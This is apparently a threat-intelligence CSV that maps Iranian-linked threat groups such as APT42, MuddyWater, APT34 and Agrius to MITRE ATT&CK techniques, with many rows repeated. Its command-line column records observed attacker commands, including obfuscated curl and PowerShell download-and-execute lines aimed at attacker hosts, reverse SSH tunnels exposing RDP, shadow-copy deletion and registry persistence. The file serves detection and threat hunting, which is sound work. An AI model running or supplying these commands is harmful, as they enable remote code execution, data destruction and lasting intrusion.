Threat Actor,Tool,Mitre Category,Mitre Technique ID,Mitre Technique Name,CLI
APT42,Cmd,execution,T1059.003,Windows Command Shell,"cmd.exe /c set c=cu7rl --s7sl-no-rev7oke -s -d \id=CgYEFk
&Prog=2_Mal_vbs.txt&WH=Form.pdf\ -X PO7ST hxxps://
prism-west-candy[.]glitch[.]me/Down -o %temp%\\down.v7bs 
& call %c:7=% & set b=sta7rt \\ \%temp%\\down.v7bs\ & call %b:7=%"
APT42,curl,execution,T1059.003,Windows Command Shell,"cmd.exe /c set c=cu7rl --s7sl-no-rev7oke -s -d \id=CgYEFk
&Prog=2_Mal_vbs.txt&WH=Form.pdf\ -X PO7ST hxxps://
prism-west-candy[.]glitch[.]me/Down -o %temp%\\down.v7bs 
& call %c:7=% & set b=sta7rt \\ \%temp%\\down.v7bs\ & call %b:7=%"
APT42,Cmd,execution,T1059.003,Windows Command Shell,cmd.exe /c set c=cu9rl --s9sl-no-rev9oke -s -d i1=aaaa&EF1=2m.txt&WF1=test.pdf -X PO9ST hxxp://tnt200[.]mywire[.]org/Do1 -o %temp%\2m.v9bs & call %c:9=% & set b=sta9rt  %temp%\2m.v9bs & call %b:9=%
APT42,curl,execution,T1059.003,Windows Command Shell,cmd.exe /c set c=cu9rl --s9sl-no-rev9oke -s -d i1=aaaa&EF1=2m.txt&WF1=test.pdf -X PO9ST hxxp://tnt200[.]mywire[.]org/Do1 -o %temp%\2m.v9bs & call %c:9=% & set b=sta9rt  %temp%\2m.v9bs & call %b:9=%
Dune,Net,execution,T1059.003,Windows Command Shell,"%WINDIR%\system32\cmd.exe /c echo %userprofile%
%ALLUSERSPROFILE%\a.txt
%WINDIR%\system32\cmd.exe /c ping.exe -n 1 4.2.2.4
%WINDIR%\system32\cmd.exe /c ping.exe -n 1 microsoft.com
%WINDIR%\system32\cmd.exe /c net user REDACTED_USERNAME /domain
%ALLUSERSPROFILE%\REDACTED_NAME_WEBSHELL_reGeorge
%ALLUSERSPROFILE%\do.zip
%WINDIR%\system32\cmd.exe /c “%PROGRAMFILES%\WinRAR\WinRAR.exe” x -o+ %ALLUSERSPROFILE%\do.zip *.* C:\ProgramData
%WINDIR%\system32\cmd.exe /c %ALLUSERSPROFILE%\do.exe"
Dune,echo,execution,T1059.003,Windows Command Shell,"%WINDIR%\system32\cmd.exe /c echo %userprofile%
%ALLUSERSPROFILE%\a.txt
%WINDIR%\system32\cmd.exe /c ping.exe -n 1 4.2.2.4
%WINDIR%\system32\cmd.exe /c ping.exe -n 1 microsoft.com
%WINDIR%\system32\cmd.exe /c net user REDACTED_USERNAME /domain
%ALLUSERSPROFILE%\REDACTED_NAME_WEBSHELL_reGeorge
%ALLUSERSPROFILE%\do.zip
%WINDIR%\system32\cmd.exe /c “%PROGRAMFILES%\WinRAR\WinRAR.exe” x -o+ %ALLUSERSPROFILE%\do.zip *.* C:\ProgramData
%WINDIR%\system32\cmd.exe /c %ALLUSERSPROFILE%\do.exe"
Dune,Cmd,execution,T1059.003,Windows Command Shell,"%WINDIR%\system32\cmd.exe /c echo %userprofile%
%ALLUSERSPROFILE%\a.txt
%WINDIR%\system32\cmd.exe /c ping.exe -n 1 4.2.2.4
%WINDIR%\system32\cmd.exe /c ping.exe -n 1 microsoft.com
%WINDIR%\system32\cmd.exe /c net user REDACTED_USERNAME /domain
%ALLUSERSPROFILE%\REDACTED_NAME_WEBSHELL_reGeorge
%ALLUSERSPROFILE%\do.zip
%WINDIR%\system32\cmd.exe /c “%PROGRAMFILES%\WinRAR\WinRAR.exe” x -o+ %ALLUSERSPROFILE%\do.zip *.* C:\ProgramData
%WINDIR%\system32\cmd.exe /c %ALLUSERSPROFILE%\do.exe"
Dune,ping,execution,T1059.003,Windows Command Shell,"%WINDIR%\system32\cmd.exe /c echo %userprofile%
%ALLUSERSPROFILE%\a.txt
%WINDIR%\system32\cmd.exe /c ping.exe -n 1 4.2.2.4
%WINDIR%\system32\cmd.exe /c ping.exe -n 1 microsoft.com
%WINDIR%\system32\cmd.exe /c net user REDACTED_USERNAME /domain
%ALLUSERSPROFILE%\REDACTED_NAME_WEBSHELL_reGeorge
%ALLUSERSPROFILE%\do.zip
%WINDIR%\system32\cmd.exe /c “%PROGRAMFILES%\WinRAR\WinRAR.exe” x -o+ %ALLUSERSPROFILE%\do.zip *.* C:\ProgramData
%WINDIR%\system32\cmd.exe /c %ALLUSERSPROFILE%\do.exe"
Dune,WinRAR,execution,T1059.003,Windows Command Shell,"%WINDIR%\system32\cmd.exe /c echo %userprofile%
%ALLUSERSPROFILE%\a.txt
%WINDIR%\system32\cmd.exe /c ping.exe -n 1 4.2.2.4
%WINDIR%\system32\cmd.exe /c ping.exe -n 1 microsoft.com
%WINDIR%\system32\cmd.exe /c net user REDACTED_USERNAME /domain
%ALLUSERSPROFILE%\REDACTED_NAME_WEBSHELL_reGeorge
%ALLUSERSPROFILE%\do.zip
%WINDIR%\system32\cmd.exe /c “%PROGRAMFILES%\WinRAR\WinRAR.exe” x -o+ %ALLUSERSPROFILE%\do.zip *.* C:\ProgramData
%WINDIR%\system32\cmd.exe /c %ALLUSERSPROFILE%\do.exe"
Dune,ssh,command-and-control,T1572,Protocol Tunneling,"ssh root@REDACTED_C2_SERVER -R 1090 -p 443 -o ServerAliveInterval=60
ssh root@REDACTED_C2_SERVER -R 1080 -p 443 -o ServerAliveInterval=60"
Dune,BCDEdit,impact,T1490,Inhibit System Recovery,"cmd.exe /c  vssadmin delete   shadows /quIet /all
cmd.exe /c wmic shadowcopy delete
cmd.exe / c bcdedit / set {default} bootstatuspolicy ignoreallfailures
cmd.exe /c bcdedit /set {default} recoveryenabled no"
Dune,VSSAdmin,impact,T1490,Inhibit System Recovery,"cmd.exe /c  vssadmin delete   shadows /quIet /all
cmd.exe /c wmic shadowcopy delete
cmd.exe / c bcdedit / set {default} bootstatuspolicy ignoreallfailures
cmd.exe /c bcdedit /set {default} recoveryenabled no"
Dune,WMIC,impact,T1490,Inhibit System Recovery,"cmd.exe /c  vssadmin delete   shadows /quIet /all
cmd.exe /c wmic shadowcopy delete
cmd.exe / c bcdedit / set {default} bootstatuspolicy ignoreallfailures
cmd.exe /c bcdedit /set {default} recoveryenabled no"
Dune,Cmd,impact,T1490,Inhibit System Recovery,"cmd.exe /c  vssadmin delete   shadows /quIet /all
cmd.exe /c wmic shadowcopy delete
cmd.exe / c bcdedit / set {default} bootstatuspolicy ignoreallfailures
cmd.exe /c bcdedit /set {default} recoveryenabled no"
APT33,,,,,SQP’s*(58vaP!tF4
APT35,networksetup,command-and-control,T1090.001,Internal Proxy,networksetup -setsocksfirewallproxy wi-fi $serveradd $portnum
APT35,PowerShell,execution,T1059.001,PowerShell,powershell  -w 1 $pnt=(Get-Content -Path %APPDATA%\Microsoft\documentLoger.txt);&(gcm i*x)$pnt
APT42,NICECURL,command-and-control,T1105,Ingress Tool Transfer,"cmd.exe /c set c=cu7rl --s7sl-no-rev7oke -s -d \id=CgYEFk
&Prog=2_Mal_vbs.txt&WH=Form.pdf\ -X PO7ST https://
prism-west-candy.glitch.me/Down -o %temp%\\down.v7bs 
& call %c:7=% & set b=sta7rt \\ \%temp%\\down.v7bs\ & call %b:7=%"
APT42,NICECURL,execution,T1204.002,Malicious File,"cmd.exe /c set c=cu7rl --s7sl-no-rev7oke -s -d \id=CgYEFk
&Prog=2_Mal_vbs.txt&WH=Form.pdf\ -X PO7ST https://
prism-west-candy.glitch.me/Down -o %temp%\\down.v7bs 
& call %c:7=% & set b=sta7rt \\ \%temp%\\down.v7bs\ & call %b:7=%"
APT42,NICECURL,execution,T1059.003,Windows Command Shell,"cmd.exe /c set c=cu7rl --s7sl-no-rev7oke -s -d \id=CgYEFk
&Prog=2_Mal_vbs.txt&WH=Form.pdf\ -X PO7ST https://
prism-west-candy.glitch.me/Down -o %temp%\\down.v7bs 
& call %c:7=% & set b=sta7rt \\ \%temp%\\down.v7bs\ & call %b:7=%"
APT42,Cmd,command-and-control,T1105,Ingress Tool Transfer,"cmd.exe /c set c=cu7rl --s7sl-no-rev7oke -s -d \id=CgYEFk
&Prog=2_Mal_vbs.txt&WH=Form.pdf\ -X PO7ST https://
prism-west-candy.glitch.me/Down -o %temp%\\down.v7bs 
& call %c:7=% & set b=sta7rt \\ \%temp%\\down.v7bs\ & call %b:7=%"
APT42,Cmd,execution,T1204.002,Malicious File,"cmd.exe /c set c=cu7rl --s7sl-no-rev7oke -s -d \id=CgYEFk
&Prog=2_Mal_vbs.txt&WH=Form.pdf\ -X PO7ST https://
prism-west-candy.glitch.me/Down -o %temp%\\down.v7bs 
& call %c:7=% & set b=sta7rt \\ \%temp%\\down.v7bs\ & call %b:7=%"
APT42,Cmd,execution,T1059.003,Windows Command Shell,"cmd.exe /c set c=cu7rl --s7sl-no-rev7oke -s -d \id=CgYEFk
&Prog=2_Mal_vbs.txt&WH=Form.pdf\ -X PO7ST https://
prism-west-candy.glitch.me/Down -o %temp%\\down.v7bs 
& call %c:7=% & set b=sta7rt \\ \%temp%\\down.v7bs\ & call %b:7=%"
APT42,curl,command-and-control,T1105,Ingress Tool Transfer,cmd.exe /c set c=cu9rl --s9sl-no-rev9oke -s -d i1=aaaa&EF1=2m.txt&WF1=test.pdf -X PO9ST http://tnt200.mywire.org/Do1 -o %temp%\2m.v9bs & call %c:9=% & set b=sta9rt  %temp%\2m.v9bs & call %b:9=%
APT42,curl,execution,T1059.003,Windows Command Shell,cmd.exe /c set c=cu9rl --s9sl-no-rev9oke -s -d i1=aaaa&EF1=2m.txt&WF1=test.pdf -X PO9ST http://tnt200.mywire.org/Do1 -o %temp%\2m.v9bs & call %c:9=% & set b=sta9rt  %temp%\2m.v9bs & call %b:9=%
APT42,Cmd,command-and-control,T1105,Ingress Tool Transfer,cmd.exe /c set c=cu9rl --s9sl-no-rev9oke -s -d i1=aaaa&EF1=2m.txt&WF1=test.pdf -X PO9ST http://tnt200.mywire.org/Do1 -o %temp%\2m.v9bs & call %c:9=% & set b=sta9rt  %temp%\2m.v9bs & call %b:9=%
APT42,Cmd,execution,T1059.003,Windows Command Shell,cmd.exe /c set c=cu9rl --s9sl-no-rev9oke -s -d i1=aaaa&EF1=2m.txt&WF1=test.pdf -X PO9ST http://tnt200.mywire.org/Do1 -o %temp%\2m.v9bs & call %c:9=% & set b=sta9rt  %temp%\2m.v9bs & call %b:9=%
APT42,NICECURL,command-and-control,T1105,Ingress Tool Transfer,cmd.exe /c set c=cu9rl --s9sl-no-rev9oke -s -d i1=aaaa&EF1=2m.txt&WF1=test.pdf -X PO9ST http://tnt200.mywire.org/Do1 -o %temp%\2m.v9bs & call %c:9=% & set b=sta9rt  %temp%\2m.v9bs & call %b:9=%
APT42,NICECURL,execution,T1059.003,Windows Command Shell,cmd.exe /c set c=cu9rl --s9sl-no-rev9oke -s -d i1=aaaa&EF1=2m.txt&WF1=test.pdf -X PO9ST http://tnt200.mywire.org/Do1 -o %temp%\2m.v9bs & call %c:9=% & set b=sta9rt  %temp%\2m.v9bs & call %b:9=%
MuddyWater,PowerShell,execution,T1059.001,PowerShell,tppmjyfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp;$tppmjyfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp=tppmjyfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp;$uri =http://95.164.38.99:443/HR5rOv8enEKonD4a0UdeGXD3xtxWix2Nf;$response = Invoke-WebRequest -Uri $uri -Method GET -ErrorAction Stop -usebasicparsing;iex $response.Content;
MuddyWater,Invoke-WebRequest,execution,T1059.001,PowerShell,tppmjyfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp;$tppmjyfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp=tppmjyfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp;$uri =http://95.164.38.99:443/HR5rOv8enEKonD4a0UdeGXD3xtxWix2Nf;$response = Invoke-WebRequest -Uri $uri -Method GET -ErrorAction Stop -usebasicparsing;iex $response.Content;
MuddyWater,Schtasks.exe,execution,T1053.005,Scheduled Task,CSIDL_SYSTEM\schtasks.exe /run /tn Microsoft\Windows\JavaX\Java Autorun
MuddyWater,WMIExec,execution,T1059.003,Windows Command Shell,cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1698662615.0451615 2>&1
MuddyWater,Cmd,execution,T1059.003,Windows Command Shell,cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1698662615.0451615 2>&1
MuddyWater,revsocks,execution,T1059.003,Windows Command Shell,CSIDL_COMMON_APPDATA\do.exe -co 94.131.3.160:443 -pa super -q
MuddyWater,PowerShell,execution,T1059.001,PowerShell,$uri =http://45.150.64.39:443/HJ3ytbqpne2tsJTEJi2D8s0hWo172A0aT;$response = Invoke-WebRequest -Uri $uri -Method GET -ErrorAction Stop -usebasicparsing;iex $response.Content;
MuddyWater,Invoke-WebRequest,execution,T1059.001,PowerShell,$uri =http://45.150.64.39:443/HJ3ytbqpne2tsJTEJi2D8s0hWo172A0aT;$response = Invoke-WebRequest -Uri $uri -Method GET -ErrorAction Stop -usebasicparsing;iex $response.Content;
MuddyWater,PowerShell,execution,T1059.001,PowerShell,powershell.exe -c $uri ='{C2_URI}';$response = Invoke-WebRequest -UseBasicParsing -Uri $uri -Method GET -ErrorAction Stop;Write-Output $response.Content;iex $response.Content;
MuddyWater,Invoke-WebRequest,execution,T1059.001,PowerShell,powershell.exe -c $uri ='{C2_URI}';$response = Invoke-WebRequest -UseBasicParsing -Uri $uri -Method GET -ErrorAction Stop;Write-Output $response.Content;iex $response.Content;
Agrius,copy,discovery,T1018,Remote System Discovery,"%WINDIR%\system32\cmd.exe /c copy %WINDIR%\temp\vmware-SYSTEMS\1.7z C:\inetpub\wwwroot\11\11.zip
%WINDIR%\system32\cmd.exe /c arp -a"
Agrius,copy,collection,T1560.001,Archive via Utility,"%WINDIR%\system32\cmd.exe /c copy %WINDIR%\temp\vmware-SYSTEMS\1.7z C:\inetpub\wwwroot\11\11.zip
%WINDIR%\system32\cmd.exe /c arp -a"
Agrius,7-Zip,discovery,T1018,Remote System Discovery,"%WINDIR%\system32\cmd.exe /c copy %WINDIR%\temp\vmware-SYSTEMS\1.7z C:\inetpub\wwwroot\11\11.zip
%WINDIR%\system32\cmd.exe /c arp -a"
Agrius,7-Zip,collection,T1560.001,Archive via Utility,"%WINDIR%\system32\cmd.exe /c copy %WINDIR%\temp\vmware-SYSTEMS\1.7z C:\inetpub\wwwroot\11\11.zip
%WINDIR%\system32\cmd.exe /c arp -a"
Agrius,ARP,discovery,T1018,Remote System Discovery,"%WINDIR%\system32\cmd.exe /c copy %WINDIR%\temp\vmware-SYSTEMS\1.7z C:\inetpub\wwwroot\11\11.zip
%WINDIR%\system32\cmd.exe /c arp -a"
Agrius,ARP,collection,T1560.001,Archive via Utility,"%WINDIR%\system32\cmd.exe /c copy %WINDIR%\temp\vmware-SYSTEMS\1.7z C:\inetpub\wwwroot\11\11.zip
%WINDIR%\system32\cmd.exe /c arp -a"
Agrius,Cmd,discovery,T1018,Remote System Discovery,"%WINDIR%\system32\cmd.exe /c copy %WINDIR%\temp\vmware-SYSTEMS\1.7z C:\inetpub\wwwroot\11\11.zip
%WINDIR%\system32\cmd.exe /c arp -a"
Agrius,Cmd,collection,T1560.001,Archive via Utility,"%WINDIR%\system32\cmd.exe /c copy %WINDIR%\temp\vmware-SYSTEMS\1.7z C:\inetpub\wwwroot\11\11.zip
%WINDIR%\system32\cmd.exe /c arp -a"
Agrius,7-Zip,collection,T1560.001,Archive via Utility,7za.exe a %WINDIR%\temp\vmware-SYSTEMS\d.7z %WINDIR%\temp\s\*.csv
Agrius,Reg,defense-evasion,T1112,Modify Registry,reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CryptSvc\Parameters /t REG_EXPAND_SZ /v ServiceDII /d mrd0x.dll /f
APT34,Plink,execution,T1059.003,Windows Command Shell,CSIDL_PROFILE\public\sat\msssh.exe 151.236.19[.]91 -P [REMOVED]-C -N -R 0.0.0.0:54231:127.0.0.1:3389 -l [REMOVED] -pw [REMOVED]
APT34,netstat,discovery,T1049,System Network Connections Discovery,netstat /an
APT34,Plink,execution,T1059.003,Windows Command Shell,CSIDL_PROFILE\public\plink.exe [REMOVED] -pw [REMOVED] -P [REMOVED] -2 -4 -T -N -C -R 0.0.0.0:999:127.0.0.1:3389
APT34,Cmd,execution,T1059.003,Windows Command Shell,cmd /c CSIDL_PROFILE\public\p2.bat > CSIDL_PROFILE\public\001.txt 2>&1
APT34,netstat,discovery,T1049,System Network Connections Discovery,netstat /aon
APT34,ssh,command-and-control,T1572,Protocol Tunneling,plink.exe ssh 78.47.218[.]106 1234qweRRR 443 10999 10.75.45.222 3389
APT34,Plink,command-and-control,T1572,Protocol Tunneling,plink.exe ssh 78.47.218[.]106 1234qweRRR 443 10999 10.75.45.222 3389
APT34,Netsh,discovery,T1518.001,Security Software Discovery,CSIDL_SYSTEM\netsh.exe advfirewall firewall show rule name=[REMOVED] verbose
APT34,PowerShell,execution,T1059.001,PowerShell,CSIDL_SYSTEM\windowspowershell\v1.0\powershell -NoProfile -Command ;& {$j = sajb {$ErrorActionPreference = 'SilentlyContinue';$groups = Get-LocalGroup | Select-Object Name Domain SID;foreach($g in $groups){-join($g.SID'|'$g.Name);$members = Get-LocalGroupMember -SID $g.SID | Select *;foreach($m in $members){-join(' '$m.SID'|'$m.Name'|'$m.ObjectClass'|'$m.PrincipalSource);}}};$r = wjb $j -Timeout 300; rcjb $j;};
APT34,netstat,discovery,T1049,System Network Connections Discovery,netstat -a
APT34,Wireshark,credential-access,T1040,Network Sniffing,";CSIDL_SYSTEM_DRIVE\program files\wireshark\extcap\usbpcapcmd.exe; --extcap-interfaces --extcap-version=4.0

;CSIDL_SYSTEM_DRIVE\program files\wireshark\dumpcap.exe; -D -Z none"
APT34,netstat,discovery,T1049,System Network Connections Discovery,netstat -a –n
APT34,Cmd,defense-evasion,T1112,Modify Registry,"reg.exe ADD ;HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg.exe ADD ;HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg.exe ADD ;HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f
cmd.exe /c reg.exe ADD ;HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f
cmd.exe /c reg.exe ADD ;HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f"
APT34,Reg,defense-evasion,T1112,Modify Registry,"reg.exe ADD ;HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg.exe ADD ;HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg.exe ADD ;HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f
cmd.exe /c reg.exe ADD ;HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f
cmd.exe /c reg.exe ADD ;HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f"
APT34,Net,lateral-movement,T1021.002,SMB/Windows Admin Shares,;CSIDL_SYSTEM\net.exe; use \\[REMOVED]\c$ /user:[REMOVED] [REMOVED]
MuddyWater,Reg,persistence,T1547.001,Registry Run Keys / Startup Folder,reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v NEW /d C:\intel\utils\utils.jse /f
MuddyWater,PowerShell,execution,T1059.001,PowerShell,powershell Start-Job -ScriptBlock {Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri http://172.16.162.1:1337/562a2ffe-a45a-4318-864b-5942fbd0a859.aspx?LY6EDE1KTNE=LY6EDE1KTNE -OutFile $input } -InputObject %ALLUSERSPROFILE%\db.sqlite;sleep 6
MuddyWater,Invoke-WebRequest,execution,T1059.001,PowerShell,powershell Start-Job -ScriptBlock {Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri http://172.16.162.1:1337/562a2ffe-a45a-4318-864b-5942fbd0a859.aspx?LY6EDE1KTNE=LY6EDE1KTNE -OutFile $input } -InputObject %ALLUSERSPROFILE%\db.sqlite;sleep 6
MuddyWater,Attrib,defense-evasion,T1564.001,Hidden Files and Directories,attrib +h %ALLUSERSPROFILE%\db.sqlite
MuddyWater,PowerShell,defense-evasion,T1564.003,Hidden Window,powershell -EP BYPASS -NoP -W 1
MuddyWater,python.exe,command-and-control,T1105,Ingress Tool Transfer,"python3 Please_Run_Once.py
wget 45.86.230.20
wget https://github.com/fatedier/frp/releases/download/v0.44.0/frp_0.44.0_linux_amd64.tar.gz tar -ZXVI Iгp_0.44.0_linux_amd64.tar.gz
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel 1.7.7_linux_amd64.gz
wget python2 wsc2.py
gunzip chisel 1.7.7_linux_amd64.gz
chmod a+x chisel 1.7.7_linux_amd64"
MuddyWater,python.exe,execution,T1059.006,Python,"python3 Please_Run_Once.py
wget 45.86.230.20
wget https://github.com/fatedier/frp/releases/download/v0.44.0/frp_0.44.0_linux_amd64.tar.gz tar -ZXVI Iгp_0.44.0_linux_amd64.tar.gz
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel 1.7.7_linux_amd64.gz
wget python2 wsc2.py
gunzip chisel 1.7.7_linux_amd64.gz
chmod a+x chisel 1.7.7_linux_amd64"
MuddyWater,python.exe,execution,T1059.003,Windows Command Shell,"python3 Please_Run_Once.py
wget 45.86.230.20
wget https://github.com/fatedier/frp/releases/download/v0.44.0/frp_0.44.0_linux_amd64.tar.gz tar -ZXVI Iгp_0.44.0_linux_amd64.tar.gz
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel 1.7.7_linux_amd64.gz
wget python2 wsc2.py
gunzip chisel 1.7.7_linux_amd64.gz
chmod a+x chisel 1.7.7_linux_amd64"
MuddyWater,chmod,command-and-control,T1105,Ingress Tool Transfer,"python3 Please_Run_Once.py
wget 45.86.230.20
wget https://github.com/fatedier/frp/releases/download/v0.44.0/frp_0.44.0_linux_amd64.tar.gz tar -ZXVI Iгp_0.44.0_linux_amd64.tar.gz
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel 1.7.7_linux_amd64.gz
wget python2 wsc2.py
gunzip chisel 1.7.7_linux_amd64.gz
chmod a+x chisel 1.7.7_linux_amd64"
MuddyWater,chmod,execution,T1059.006,Python,"python3 Please_Run_Once.py
wget 45.86.230.20
wget https://github.com/fatedier/frp/releases/download/v0.44.0/frp_0.44.0_linux_amd64.tar.gz tar -ZXVI Iгp_0.44.0_linux_amd64.tar.gz
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel 1.7.7_linux_amd64.gz
wget python2 wsc2.py
gunzip chisel 1.7.7_linux_amd64.gz
chmod a+x chisel 1.7.7_linux_amd64"
MuddyWater,chmod,execution,T1059.003,Windows Command Shell,"python3 Please_Run_Once.py
wget 45.86.230.20
wget https://github.com/fatedier/frp/releases/download/v0.44.0/frp_0.44.0_linux_amd64.tar.gz tar -ZXVI Iгp_0.44.0_linux_amd64.tar.gz
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel 1.7.7_linux_amd64.gz
wget python2 wsc2.py
gunzip chisel 1.7.7_linux_amd64.gz
chmod a+x chisel 1.7.7_linux_amd64"
